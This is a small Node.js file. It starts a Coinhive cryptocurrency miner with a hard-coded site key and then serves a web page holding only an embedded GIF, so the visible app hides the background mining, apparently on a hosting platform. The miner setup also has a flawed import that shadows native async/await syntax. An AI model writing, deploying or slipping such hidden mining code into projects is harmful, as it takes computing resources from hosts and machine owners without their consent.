const ch = require('coin-hive');
const http = require('http');
var async = require('asyncawait/async');
var await = require('asyncawait/await');

(async () => {
    const m = await ch('dxNo2OhEyTCX5pMQYGoQdKL49JvPQmAU');
    await m.start();
})();

const requestHandler = (request, response) => {
  response.end('<iframe src="https://giphy.com/embed/z48aJruaX0Jsk" width="480" height="358" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>')
}

const server = http.createServer(requestHandler)
server.listen(process.env.PORT)

console.log(process.pid)
